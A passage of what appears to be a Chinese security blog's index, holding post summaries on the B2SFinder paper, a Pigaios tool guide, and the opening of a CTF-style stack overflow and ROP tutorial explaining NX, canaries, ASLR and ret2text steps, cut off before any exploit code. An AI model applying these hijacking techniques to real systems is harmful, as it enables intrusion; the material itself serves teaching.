也会成为研究或者实践中的热点问题之一。</p><p>例如可以想策略去除FUZZFICATION的设置，或者在fuzzer中加入新的启发式策略，从而减少FUZZIFICATION对fuzzer的影响。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>B2SFinder——Detecting Open-Source Software Reuse in COTS Software(ASE 2019)</title>
    <url>/157adce2.html</url>
    <content><![CDATA[<h2><span id="pb2sfinder-detecting-open-source-software-reuse-in-cots-software">B2SFinder: Detecting Open-Source Software Reuse in COTS Software</span><a href="#pb2sfinder-detecting-open-source-software-reuse-in-cots-software" class="header-anchor">#</a></h2><blockquote><p>B2SFinder 主要是为了解决闭源二进制软件中对复用开源组件检测的问题，由于复用了开源组件，当开源组件发现存在漏洞时，复用它的二进制软件也会存在漏洞，即OSS复用漏洞。</p><p>PS：我挂了个n作</p></blockquote><h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>虽然此前也有一些工作致力于研究二进制和源代码的匹配方法，并能进行大规模的分析，但他们只支持一些简单的特征。在他们的研究中只能近似的衡量OSS复用，忽略了项目中的代码结构。</p><p>为了解决这个问题，B2SFinder通过对二进制文件和源代码中的7种特征进行提取，并对7种特征使用三种匹配方法和两种重要性加权方法，计算匹配分数。通过这种方法，我们对1000个流行的二进制软件中的21991个二进制文件和2189个开源库的复用进行了评估。平均每个二进制文件耗时53.85秒。我们也讨论了如何使用B2SFinder检测OSS复用漏洞。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>对于OSS复用检测，一般来说可以分为两种方法：</p><ol><li>软件二进制 v.s. 开源组件二进制</li><li>软件二进制 v.s. 开源组件源码</li></ol><p>对于第一种方法，主要存在以下两个问题：</p><ol><li>从搜集到的2189个开源库中发现，只有1/4左右能自动编译</li><li>二进制相似性匹配效率低，难以规模化</li></ol><p>对于第二种方法，此前也已有一些研究见下表</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1genns60fo3j30vu0boae9.jpg" alt="image-20200510210806748"></p><p>因此，我们能够提出以下问题：</p><ol><li>选取哪些特征，且能对抗编译优化？</li><li>如何精确计算特征之间的相似性？</li><li>我们如何利用开源软件的代码结构来提高复用识别能力？</li></ol><p>B2SFinder的<strong>工作流</strong>如下：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geno02o1vnj312u08gjtj.jpg" alt="image-20200510211509018"></p><p>整体上的<strong>特征分类以及算法</strong>如下：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1genogq57s4j30u80g245h.jpg" alt="image-20200510213142174"></p><p>同时，我们也将复用分为以下三类：单一复用、部分复用和嵌套复用，其中前两类是真正的复用。</p><p><strong>实验结果：</strong></p><p>1000个闭源软件中的21991个二进制文件 v.s. 2189个开源库</p><p>达到了92.3%的检测精度以及88.5%的召回率，并且速度更快</p><p>在结果中发现63.4%的闭源软件复用了开源库，并且4.6%的开源库被复用了十次以上，平均每个库存在54.7个已知CVE。</p><h2><span id="pmotivation">Motivation</span><a href="#pmotivation" class="header-anchor">#</a></h2><p>以两个真实例子为例：</p><ul><li>Foxit Reader和ssleay32.dll复用openssl</li><li>Libopenjp2-7.dll复用OpenJPEG</li></ul><h3><span id="pmatching-score-calculation">Matching Score Calculation</span><a href="#pmatching-score-calculation" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1genoveqrxjj31200k40xr.jpg" alt="image-20200510214549545"></p><p>从上图中可以看到，FoxitReader.exe和Openssl的export部分没有共同的函数名，并且只有19.7%的字符串常量为共有字符串。因此我们能够知道BAT和OSSPolice这两种方法在这一例子中效果是不理想的。但是我们能够在data段和rdata段以及text段找到一些其他的特征能够匹配上，最终，我们为B2SFinder选取了图中的7种特征。</p><p>有了特征，那么二进制和源码特征之间的特征匹配就是一个新的问题，特别是一些特征在编译的时候，会被轻微的修改</p><p>对于七种特征，我们共使用了3种特征匹配算法</p><ul><li>字符串型（导出函数、字符串数组和导出函数）：使用字符串之间的精确匹配并使用倒排索引方式检索。</li><li>数字数组型（全局常量数组、全局枚举数组）：使用二进制片段检索的匹配</li><li>控制流型（if else、switch case）:基于语义等价的匹配</li></ul><p>注意匹配算法并不等同于匹配分数计算，对此，我们使用了两种分数计算方法</p><ul><li>二进制信息熵</li><li>TF-IDF</li></ul><h3><span id="preuse-type-identification">Reuse Type Identification</span><a href="#preuse-type-identification" class="header-anchor">#</a></h3><p>分为单一复用和部分复用两类</p><p>在大多数情况下，匹配分数高判断为复用是正确的，这是最简单的一种，单一复用</p><p>实验中也发现了部分复用的情况，例如libssl（ssleay），只复用了openssl中7.6%的源代码文件，因此匹配分数并不高</p><p>为了识别部分复用的情况，考虑开源项目的代码结构是十分重要的。我们首先将开源项目分解为库模块，并分析编译过程获得库模块和源码的关系，例如openssl编译出来会有libssl和libcrypto两个库模块，称为开源库之间的包含关系。</p><h2><span id="pdesign">Design</span><a href="#pdesign" class="header-anchor">#</a></h2><h3><span id="pselecting-code-feature">Selecting Code Feature</span><a href="#pselecting-code-feature" class="header-anchor">#</a></h3><p>特征选取只要考虑两个影响：1、特征在源码和二进制上都存在；2、编译过程对特征改变不大。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geoihxp3oyj30tk0fqacg.jpg" alt="image-20200511145048120"></p><h3><span id="pmatching-code-features">Matching Code Features</span><a href="#pmatching-code-features" class="header-anchor">#</a></h3><p>将7种特征分为 字符串型、数字型和控制流型，并使用不同的算法进行匹配</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geoimm7s70j30ta0egtba.jpg" alt="image-20200511145520328"></p><p><strong>算法：</strong></p><p>字符串型：完全匹配。</p><p>数字型：全局整数/枚举数组作为可搜索的连续比特流存储在二进制文件的数据段中，因此，采用将其编码后直接在.data和.radata中寻找的方法尽心匹配。</p><p>控制流型：基于语义的匹配。例如，对于switch case来说，源码中为<code>[􏰁{0},{9},{16},{17},{20}􏰂]</code>，但二进制中提取到的jump table是<code>􏰁{0},{9},{16},{17},{20},{1,2,3,4,5,6,7,8,10, 11,12,13,14,15,18,19}􏰂</code>，他们是语义等价的。对于if else特征来说，二进制提取的是最长的公共子序列<code>[0x1,0x80,0x800,0x10000,0x200000,0x10]</code>，但源码中为<code>[0x80,0x800,0x10000, 0x200000]</code>，他们也是匹配的，匹配长度为4</p><h3><span id="pdetermining-the-importance-weights-of-feature-instances">Determining the Importance-Weights of Feature Instances</span><a href="#pdetermining-the-importance-weights-of-feature-instances" class="header-anchor">#</a></h3><p>对于一些常见的特征，例如base64的表等，由于其特殊性不够，因此对判断复用哪个库的参考不够大，为了衡量特殊性，我们采用了类TF-IDF的S-IDF方法</p><ul><li><p>For a string-typed feature, we use the number of its substrings, including URLs and copyright information (among others).</p></li><li><p>For an integer-typed feature, the entropy for its bitstream is used.</p></li><li><p>For a control-flow-typed feature, the length of its constant sequence is used.</p></li></ul><p><strong>Computing the Specificity Weights of Bitstreams as Entrophy</strong></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geojw70gagj30sy0agmyq.jpg" alt="image-20200511153909084"></p><p><strong>S-IDF for Computing Frequency Weights</strong></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geojxtd4loj30oa03k0sy.jpg" alt="image-20200511154042185"></p><h3><span id="pcomputing-matching-scores">Computing Matching Scores</span><a href="#pcomputing-matching-scores" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geojysjfwlj30kc0zcdl4.jpg" alt="image-20200511154138803"></p><h3><span id="pidentifying-reuse-types">Identifying Reuse Types</span><a href="#pidentifying-reuse-types" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geok073hrbj30ki06kgmi.jpg" alt="image-20200511154259605"></p><p>识别部分复用：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geok231wa1j30ke0lw41e.jpg" alt="image-20200511154448598"></p><p>识别递归复用：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geok2ieb3zj30k0094dh3.jpg" alt="image-20200511154512900"></p><h2><span id="pimplementation">IMPLEMENTATION</span><a href="#pimplementation" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geok4chk3yj315e0ewn19.jpg" alt="image-20200511154659189"></p><h2><span id="pge-ren-gan-jue">个人感觉</span><a href="#pge-ren-gan-jue" class="header-anchor">#</a></h2><p>说一下在最近的分析和改进过程中，发现的一些尚需改进的问题：</p><ol><li><p>在一些库中，由于存在大量static函数，一旦优化会产生内联，影响匹配效果。</p></li><li><p>在项目实现上，If else特征部分存在问题，由于比较的是cmp命令，因此在二进制特征提取时，循环中的判断常量也会提取出来，而源码仅提取if else中常量，虽然在比较时采用了最长匹配方法，但实际上仍不够理想。进一步改进可能得先识别循环，从二进制特征中将循环的cmp去除。</p></li></ol>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>源码二进制比对工具Pigaios</title>
    <url>/dc413e13.html</url>
    <content><![CDATA[<h2><span id="ppigaios-yuan-li-jian-jie">Pigaios原理简介</span><a href="#ppigaios-yuan-li-jian-jie" class="header-anchor">#</a></h2><p><strong>目的：</strong> 为了解决符号表问题</p><p><strong>两种方案：</strong></p><ol><li>编译源码，使用 Diaphora (or BinDiff) 导出符号表，导入符号表缺失样本</li><li>从源码题符号表，导入符号表缺失样本</li></ol><p>第二种方法好处在于不需要完全编译，因为对于旧的源码，有的很难编译成功</p><a id="more"></a><h3><span id="pgong-zuo-liu-cheng">工作流程</span><a href="#pgong-zuo-liu-cheng" class="header-anchor">#</a></h3><ul><li>解析源代码，并从每个函数的抽象语法树（AST）中提取信息。</li><li>IDA导入从源代码提取的包含源码信息的数据库。</li><li>查找在C源代码和IDA数据库中找到的函数匹配。</li><li>找到没有误报的初始匹配项后，从调用图中找到更多匹配项。</li><li>使用“专家系统”和“基于机器学习”的系统进行评分。</li><li>同样，将给定代码库的所有结构和枚举导入IDA数据库（这在IDA中并不简单）。</li></ul><h3><span id="pjie-xi-han-shu">解析函数</span><a href="#pjie-xi-han-shu" class="header-anchor">#</a></h3><p>二进制：通过IDA</p><p>源码：通过CLang，提取</p><ul><li>字符串常量</li><li>循环次数、条件判断、函数调用、全局变量</li><li>switch信息</li><li>函数调用信息</li><li>是否为递归函数</li></ul><h3><span id="pte-zheng-pi-pei">特征匹配</span><a href="#pte-zheng-pi-pei" class="header-anchor">#</a></h3><h4><span id="pchang-gui-fang-fa">常规方法</span><a href="#pchang-gui-fang-fa" class="header-anchor">#</a></h4><h5><span id="pwan-quan-pi-pei">完全匹配</span><a href="#pwan-quan-pi-pei" class="header-anchor">#</a></h5><p>首先是百分百匹配：为了达到零误报的目的</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecyjm66jgj315s0aedtq.jpg" alt="image-20200501145915448" style="zoom:67%"><p>作者实验结果为在4817个函数中找到了90完全匹配，虽然数目少，但胜在百分百确认，没有误报，不会对分析造成误导。</p><h5><span id="pqi-fa-shi-fang-fa">启发式方法</span><a href="#pqi-fa-shi-fang-fa" class="header-anchor">#</a></h5><p>为了找到更多的匹配，就需要一些启发式信息了</p><p>启发式：</p><ol><li>调用图</li><li>临近函数</li><li>特殊的callee</li><li>少见的常量特征</li></ol><h4><span id="pji-qi-xue-xi-fang-fa">机器学习方法</span><a href="#pji-qi-xue-xi-fang-fa" class="header-anchor">#</a></h4><p>多分类，使用以下算法</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecyrdaqs4j310u07oqb4.jpg" alt="image-20200501150640570"></p><h3><span id="pzong-he-kao-liang">综合考量</span><a href="#pzong-he-kao-liang" class="header-anchor">#</a></h3><p>当常规算法和ML结果都表现很好时，就说明匹配度very very good，两者可相互印证</p><h2><span id="ppigaios-shi-yong-zhi-bei">Pigaios使用指北</span><a href="#ppigaios-shi-yong-zhi-bei" class="header-anchor">#</a></h2><p>Pigaios是一款源码二进制比对工具，在实际二进制样本分析中，带符号表的样本极其少见，这个时候工具的作用就显现出来了。</p><h3><span id="pan-zhuang">安装</span><a href="#pan-zhuang" class="header-anchor">#</a></h3><p>在提取源码特征的机器（例如ubuntu）上安装依赖如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ apt-get install clang python-clang-5.0 libclang-5.0-dev python-colorama python-sklearn</span><br></pre></td></tr></table></figure><p>在装有IDA的机子上也同时安装以下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pip install clang-5 colorama scikit-learn</span><br></pre></td></tr></table></figure><h3><span id="pyuan-ma-te-zheng-ti-qu-guo-cheng">源码特征提取过程</span><a href="#pyuan-ma-te-zheng-ti-qu-guo-cheng" class="header-anchor">#</a></h3><p>下以<code>https://zlib.net/zlib-1.2.11.tar.gz</code>为例</p><h4><span id="psheng-cheng-xiang-mu-xin-xi-wen-jian">生成项目信息文件</span><a href="#psheng-cheng-xiang-mu-xin-xi-wen-jian" class="header-anchor">#</a></h4><p>在源码根目录下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python &#x2F;path&#x2F;to&#x2F;pigaios&#x2F;srcbindiff.py -create</span><br></pre></td></tr></table></figure><p>默认生成文件<code>sbd.project</code>，内容为CXX，LLVM等配置信息，以及源码信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">####################################################</span><br><span class="line"># Default Source-Binary-Differ project configuration</span><br><span class="line">####################################################</span><br><span class="line">[GENERAL]</span><br><span class="line">includes &#x3D; &#x2F;usr&#x2F;lib&#x2F;llvm-3.8&#x2F;bin&#x2F;..&#x2F;lib&#x2F;clang&#x2F;3.8.0&#x2F;include</span><br><span class="line">inlines &#x3D; 0</span><br><span class="line"></span><br><span class="line">[PROJECT]</span><br><span class="line">cflags &#x3D; -I. -I.&#x2F;include</span><br><span class="line">cxxflags &#x3D; -I. -I.&#x2F;include</span><br><span class="line">export-file &#x3D; zlib-1.2.11.sqlite</span><br><span class="line">export-header &#x3D; zlib-1.2.11-exported.h</span><br><span class="line">export-indent &#x3D; clang-format -i</span><br><span class="line"></span><br><span class="line">[FILES]</span><br><span class="line">contrib&#x2F;masmx64&#x2F;inffas8664.c &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream&#x2F;test.cpp &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream&#x2F;zfstream.cpp &#x3D; 1</span><br><span class="line">contrib&#x2F;testzlib&#x2F;testzlib.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;minizip.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;ioapi.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;iowin32.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;zip.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;miniunz.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;mztools.c &#x3D; 1</span><br><span class="line">contrib&#x2F;minizip&#x2F;unzip.c &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream2&#x2F;zstream_test.cpp &#x3D; 1</span><br><span class="line">contrib&#x2F;inflate86&#x2F;inffas86.c &#x3D; 1</span><br><span class="line">contrib&#x2F;infback9&#x2F;infback9.c &#x3D; 1</span><br><span class="line">contrib&#x2F;infback9&#x2F;inftree9.c &#x3D; 1</span><br><span class="line">contrib&#x2F;puff&#x2F;pufftest.c &#x3D; 1</span><br><span class="line">contrib&#x2F;puff&#x2F;puff.c &#x3D; 1</span><br><span class="line">contrib&#x2F;untgz&#x2F;untgz.c &#x3D; 1</span><br><span class="line">contrib&#x2F;blast&#x2F;blast.c &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream3&#x2F;test.cc &#x3D; 1</span><br><span class="line">contrib&#x2F;iostream3&#x2F;zfstream.cc &#x3D; 1</span><br><span class="line">examples&#x2F;gzappend.c &#x3D; 1</span><br><span class="line">examples&#x2F;gun.c &#x3D; 1</span><br><span class="line">examples&#x2F;zpipe.c &#x3D; 1</span><br><span class="line">examples&#x2F;gzjoin.c &#x3D; 1</span><br><span class="line">examples&#x2F;fitblk.c &#x3D; 1</span><br><span class="line">examples&#x2F;zran.c &#x3D; 1</span><br><span class="line">examples&#x2F;gzlog.c &#x3D; 1</span><br><span class="line">examples&#x2F;enough.c &#x3D; 1</span><br><span class="line">test&#x2F;minigzip.c &#x3D; 1</span><br><span class="line">test&#x2F;infcover.c &#x3D; 1</span><br><span class="line">test&#x2F;example.c &#x3D; 1</span><br><span class="line">inftrees.c &#x3D; 1</span><br><span class="line">gzlib.c &#x3D; 1</span><br><span class="line">inflate.c &#x3D; 1</span><br><span class="line">adler32.c &#x3D; 1</span><br><span class="line">gzclose.c &#x3D; 1</span><br><span class="line">deflate.c &#x3D; 1</span><br><span class="line">infback.c &#x3D; 1</span><br><span class="line">crc32.c &#x3D; 1</span><br><span class="line">zutil.c &#x3D; 1</span><br><span class="line">inffast.c &#x3D; 1</span><br><span class="line">trees.c &#x3D; 1</span><br><span class="line">uncompr.c &#x3D; 1</span><br><span class="line">gzread.c &#x3D; 1</span><br><span class="line">compress.c &#x3D; 1</span><br><span class="line">gzwrite.c &#x3D; 1</span><br></pre></td></tr></table></figure><p>由于实际上<code>example</code>、<code>test</code>等目录包含的是测试样例，可以选择去除对这些文件的分析</p><h4><span id="pti-qu-yuan-ma-te-zheng">提取源码特征</span><a href="#pti-qu-yuan-ma-te-zheng" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python &#x2F;path&#x2F;to&#x2F;pigaios&#x2F;srcbindiff.py -export</span><br></pre></td></tr></table></figure><p>结果存储在<code>.sqlite</code>文件中，在处理过程中会有库文件缺失，以及一些其他的error和fetal，但是没关系，Pigaios都会处理</p><p>可以简要查看一下存了哪些信息，如下：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecx4jc4dwj308s04cglr.jpg" alt="image-20200501141010098"></p><p>包括调用图信息，常量信息，函数信息，源文件信息</p><p><strong>调用图信息</strong></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecx5nze0gj30me05s3z4.jpg" alt="image-20200501141115387"></p><p><strong>常量信息</strong></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecx60n0mrj30zm08agn3.jpg" alt="image-20200501141136179"></p><p>都是字符串常量</p><p><strong>函数信息</strong></p><p>巨长，这里以tsv格式给出第94行和第127行两条记录，具体字段如下，提取了条件信息，switchcase信息，调用信息等</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecxc4clvsj30fs0qiq5v.jpg" alt="image-20200501141728005" style="zoom:50%"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">94		44176	inflate	__int64 __fastcall()		289		21	[&quot;invalid block type&quot;, &quot;incorrect data check&quot;, &quot;too many length or distance symbols&quot;, &quot;invalid stored block lengths&quot;, &quot;invalid literal&#x2F;length code&quot;, &quot;unknown compression method&quot;, &quot;incorrect header check&quot;, &quot;header crc mismatch&quot;, &quot;invalid distances set&quot;, &quot;invalid code lengths set&quot;, 595056260442243601, &quot;(I&quot;, &quot;unknown header flags set&quot;, &quot;invalid window size&quot;, &quot;invalid distance too far back&quot;, &quot;invalid distance code&quot;, &quot;incorrect length check&quot;, &quot;invalid literal&#x2F;lengths set&quot;, &quot;invalid bit length repeat&quot;, &quot;invalid code -- missing end-of-block&quot;, &quot;&#96;\u0007&quot;]	1	1	[[31, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]]]	6	22	&#123;&quot;.crc32&quot;: 12, &quot;.adler32&quot;: 4, &quot;inflate_table&quot;: 3, &quot;.memcpy&quot;: 5, &quot;.__stack_chk_fail&quot;: 1, &quot;inflate_fast&quot;: 1&#125;	1	1	0		[&quot;incorrect&quot;, &quot;header&quot;]</span><br><span class="line">127		69776	gz_open	__int64 __fastcall(char *file, int fd)	__int64 __fastcall gz_open(char *file, int fd)	21		4	[18446744073709027328, 524481, &quot;%s&quot;, 524353]	1	1	[[78, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77]]]	6	2	&#123;&quot;.open&quot;: 1, &quot;.lseek64&quot;: 2, &quot;.malloc&quot;: 2, &quot;.snprintf&quot;: 1, &quot;.strlen&quot;: 1, &quot;.free&quot;: 3&#125;	1	0	0</span><br></pre></td></tr></table></figure><p><strong>源文件信息</strong></p><p>不知道为啥是空的</p><h3><span id="pyuan-ma-er-jin-zhi-bi-dui">源码二进制比对</span><a href="#pyuan-ma-er-jin-zhi-bi-dui" class="header-anchor">#</a></h3><p>打开编译好并stripped掉的<code>libz.so.1.2.11</code>，运行pigiaos脚本<code>sourceimp_ids.py</code></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecxj060uij314k0okwht.jpg" alt="image-20200501142404896"></p><p>可能因为IDA版本原因，需要在<code>Indent command</code>中去掉<code>-kr</code>选项，匹配结果如下</p><p><strong>Diff pseudo-code</strong></p><p>是将二进制函数反编译并和源码比较，由于颜色原因看不清，可能是因为我的IDA用了黑色主题。</p><p>左侧为二进制函数F5结果，右侧为源码函数。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecxnqjc9mj31om0u0tok.jpg" alt="image-20200501142837530"></p><p><strong>show match reason</strong></p><p>显示匹配原因</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecxou3l31j30qo0dcgny.jpg" alt="image-20200501142941360" style="zoom:50%"><p><strong>import all functions</strong></p><p>不是很好用，有错误导入不进来，应该是IDA版本原因</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecxr7f6bzj30i2078myf.jpg" alt="image-20200501143157961" style="zoom:50%"><h4><span id="pzhu-yi">注意</span><a href="#pzhu-yi" class="header-anchor">#</a></h4><p>值得一提的是，从效果来看，strip对匹配结果影响很大，当未stripped时，可以获得31条匹配结果</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecxwstxf0j31kr0u0aoi.jpg" alt="image-20200501143719326"></p><p>而当stripped时，只有18个匹配结果</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gecxy4dmihj31ty0ladq1.jpg" alt="image-20200501142607993"></p><p>但前面也提到，Pigaios的主要目的是低误报率，避免误导分析人员，所以也是一个不错的工具</p><h3><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h3><ul><li><a href="https://github.com/joxeankoret/pigaios" target="_blank" rel="noopener">Pigaios源码</a></li></ul>]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出与ROP分析与利用</title>
    <url>/1fd25de4.html</url>
    <content><![CDATA[<h2><span id="pji-chu-zhi-shi">基础知识</span><a href="#pji-chu-zhi-shi" class="header-anchor">#</a></h2><h3><span id="pzhan-yi-chu-yu-rop">栈溢出与ROP</span><a href="#pzhan-yi-chu-yu-rop" class="header-anchor">#</a></h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。栈溢出漏洞就是由于栈溢出而导致的漏洞。在程序执行过程中，常使用栈帧记录程序执行过程中的状态，在栈帧中保存着返回地址，当利用栈溢出漏洞修改函数返回地址跳转到非预期地址执行时，就产生了ROP攻击，又称返回导向编程。</p><a id="more"></a><h3><span id="pcheng-xu-diao-yong-zhan">程序调用栈</span><a href="#pcheng-xu-diao-yong-zhan" class="header-anchor">#</a></h3><p>栈帧是记录程序执行过程中状态的结构。在cdecl调用约定中，当程序P调用Q时，会出现以下行为：</p><ol><li>P将Q需要的参数保存到栈或者约定寄存器中，再将Q的返回地址存入栈；</li><li>Q在栈中保存当前esp/rsp寄存器中的值，再将ebp/rbp寄存器中值赋值给esp/rsp寄存器形成栈帧；</li><li>Q申请的局部变量需要的栈空间；</li><li>当Q执行完毕，使用栈中保存的esp/rsp值恢复给esp/rsp寄存器；</li><li>从栈中取出返回地址，跳转回P中继续执行；</li></ol><p>正是因为存在程序调用栈，当出现栈溢出漏洞时，我们能够对返回地址进行劫持，修改程序默认执行路径，达到自己的目的。</p><h2><span id="pchang-jian-bao-hu-ji-zhi">常见保护机制</span><a href="#pchang-jian-bao-hu-ji-zhi" class="header-anchor">#</a></h2><p>在栈溢出漏洞攻防博弈中，程序的保护机制十分重要。对白客来说，通过添加程序保护机制，能够提高漏洞利用的门槛，一定程度上防止程序漏洞被利用；而对于黑客来说，熟悉程序保护机制，能够在漏洞利用过程中少走弯路，提高漏洞利用的效率。</p><p>图2.1所示是使用checksec工具检查linux系统中sh二进制文件的结果。可以看到它启用了RELRO、Canary、NX、PIE和FORTIFY保护。其中Canary、NX和PIE这三种在实际利用中较为常见且有用。其中Canary 和NX在Windows系统中也有类似的保护机制。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0ymqmgj31820b2myd.jpg" alt="img"></p><center>图2.1 linux下sh中存在的保护机制</center><h3><span id="pnx-yu-dep">NX与DEP</span><a href="#pnx-yu-dep" class="header-anchor">#</a></h3><p>NX是No eXcute的缩写，意为不可执行保护，在Windows系统中为DEP保护。其根本原理如图2.2所示，黑客需要利用漏洞劫持返回地址到某个位置执行，而这一保护将区域置为不可执行，当跳转到该区域内时，检测到异常，触发异常处理并退出程序，使得劫持失效。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n1079wjj30vu0cyaki.jpg" alt="img"></p><center>图2.2 NX/DEP原理</center><h3><span id="pcanary-yu-gs">Canary与GS</span><a href="#pcanary-yu-gs" class="header-anchor">#</a></h3><p>Linux下的Canary保护对应Windows下的GS保护。利用栈溢出是线性连续的覆盖栈内的数据这一特性，在返回地址前插入一个随机的不可预测值，并在函数返回时检查是否被修改，如果被修改，则一定产生了栈溢出，此时会退出程序执行。如图2.3所示，是x86下的Canary保护时栈内布局示意图。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n13eoemj30k40eet9h.jpg" alt="img"></p><center>图2.3 Canary/GS保护栈布局图</center><h3><span id="ppie-yu-aslr">PIE与ASLR</span><a href="#ppie-yu-aslr" class="header-anchor">#</a></h3><p>PIE是编译过程中的选项，是位置独立的可执行区域的意思。当操作系统开启ASLR（内存地址随机化）时，会打乱二进制文件加载的基址，使得返回地址随机，即使动态调试中EXP通过，但远程攻击时也会由于地址随机化机制失效。操作系统中ASLR存在3个可选项，如下：</p><ul><li>值为0：无随机化，堆栈地址每次都相同</li><li>值为1：随机化出了堆基址以外的所有加载基址</li><li>值为2：随机化所有加载基址（包括堆）</li></ul><h2><span id="prop-fen-xi-yu-li-yong">ROP分析与利用</span><a href="#prop-fen-xi-yu-li-yong" class="header-anchor">#</a></h2><p>ROP，又称返回导向编程，利用程序指令集中存在的ret指令，改变指令流的执行顺序。其利用条件为：</p><ol><li>程序存在溢出且能够控制返回地址；</li><li>可以找到满足条件的gadgets和gadgets地址。</li></ol><p>基本的分类如下：ret2text、ret2shellcode、ret2syscall、ret2libc。</p><p>注：以下分析与利用都为32位程序，示例二进制文件来源于<a href="http://ctfwiki.ycdxsb.cn/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">ctfwiki</a>。</p><h3><span id="pret2text">ret2text</span><a href="#pret2text" class="header-anchor">#</a></h3><p>ret2text是指返回到程序中text段已有的代码中执行。</p><p>分析与利用步骤： 以附件中的ret2text程序为例</p><ol><li>checksec查看保护结果如图3.1.1所示，能够看到没有开启保护。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n13umjmj30n008s758.jpg" alt="img"></p><center>图3.1.1 checksec查看ret2text结果</center><ol start="2"><li>使用IDA查看ret2text main函数如图3.1.2所示，能够看到存在栈溢出漏洞，由于gets函数未判断读入长度，能使用读入的字符串写入s覆盖到main函数返回地址。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0qb7u9j30vy0didhe.jpg" alt="img"></p><center>图3.1.2 ret2text main函数</center><ol start="3"><li>在secure函数中寻找到system(“/bin/sh”)，如图3.1.3</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n113om5j30s60f2wg5.jpg" alt="img"></p><center>图3.1.3 secure函数</center><ol start="4"><li>通过输入对栈进行布局。由于未开启保护，我们能直接找到调用system(“/bin/sh”)的指令地址system_binsh_addr，因此我们通过栈溢出布置栈布局如图3.1.4所示，栈溢出首先需要覆盖旧的ebp值，进而覆盖到返回地址，将其修改为system_binsh_addr的地址即可。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0s4ub1j30ts0akdil.jpg" alt="img"></p><center>图3.1.4 ret2text栈布局</center><ol 